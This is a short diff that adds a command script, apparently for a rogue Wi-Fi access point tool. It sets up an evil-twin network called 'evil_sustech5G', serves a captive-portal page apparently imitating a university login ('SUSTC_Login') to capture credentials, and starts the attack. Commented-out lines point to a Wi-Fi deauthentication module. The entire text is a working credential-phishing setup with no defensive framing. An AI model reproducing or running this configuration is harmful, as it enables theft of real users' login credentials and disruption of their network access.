@@ -1,0 +1,8 @@
+set ssid evil_sustech5G
+set interface wlp53s0f4u1
+set proxy captiveflask
+set captiveflask.SUSTC_Login true
+start
+#use wifi.wifideauth
+#set interface wlp53s0f4u1
+#scan
